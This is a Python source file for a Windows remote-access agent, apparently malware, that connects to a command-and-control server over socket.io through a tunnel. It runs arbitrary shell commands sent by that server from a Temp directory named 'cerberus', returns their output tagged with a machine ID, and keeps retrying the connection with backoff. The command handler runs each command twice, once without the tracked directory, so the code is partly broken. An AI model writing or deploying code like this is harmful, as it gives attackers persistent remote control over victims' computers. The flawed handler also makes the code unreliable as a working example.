import subprocess 
import threading
import socketio
import time
import locale
import os
from config import C2_HOST, C2_PORT, MACHINE_ID

C2_URL = C2_HOST  # port handled by Cloudflare tunnel, no need to append
cwd = os.path.expandvars(r"C:\Windows\Temp\cerberus")

def get_console_encoding():
    """Read the active OEM codepage from the system registry."""
    result = subprocess.run("chcp", shell=True, capture_output=True, text=True, encoding="ascii")
    try:
        return "cp" + result.stdout.strip().split(": ")[1]
    except:
        return "cp850"  #generic fallback

CONSOLE_ENCODING = get_console_encoding()

def run_command(command: str) -> str:
    """Run a command in the current cwd, update cwd if it was a cd command."""
    global cwd

    stripped = command.strip()

    # Handle cd manually — subprocess.run can't report its own cwd back to us
    if stripped.lower().startswith("cd"):
        parts = stripped.split(None, 1)
        if len(parts) == 1:
            # bare "cd" — just return current directory like cmd.exe does
            return cwd
        target = parts[1].strip()
        new_cwd = os.path.normpath(os.path.join(cwd, target))
        if os.path.isdir(new_cwd):
            cwd = new_cwd
            return ""
        else:
            return f"The system cannot find the path specified: {new_cwd}"
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=10,
            cwd=cwd,
            encoding=CONSOLE_ENCODING,
            errors="replace"
        )
        return (result.stdout + result.stderr) or "(no output)"
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"[error] {e}"

def make_client():
    """Create a fresh socketio client with event handlers registered."""
    sio = socketio.Client()

    @sio.on("connect")
    def on_connect():
        print("[+] Shell agent connected to C2")

    @sio.on("shell_command")
    def on_command(data):
        command = data.get("command", "")
        if not command:
            return
        output = run_command(command)
        sio.emit("shell_output", {
            "machine": MACHINE_ID,
            "output": output
        })
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10,
                encoding=CONSOLE_ENCODING,
                errors="replace"
            )
            output = result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            output = "[timeout]"
        except Exception as e:
            output = f"[error] {e}"

        sio.emit("shell_output", {
            "machine": MACHINE_ID,
            "output": output
        })

    return sio


def start():
    """Connect to C2 with exponential backoff retry on failure."""
    delay = 2       # starting wait time in seconds
    max_delay = 60  # cap — never wait longer than this

    while True:
        sio = make_client()
        try:
            sio.connect(C2_URL)
            sio.wait()          # blocks until disconnected
        except Exception:
            pass                # connection failed or dropped — fall through to retry
        finally:
            try:
                sio.disconnect()
            except Exception:
                pass

        # If we get here, connection was lost or never made — retry
        print(f"[!] Disconnected. Retrying in {delay}s...")
        time.sleep(delay)
        delay = min(delay * 2, max_delay)  # double it, but cap at max_delay


if __name__ == "__main__":
    start()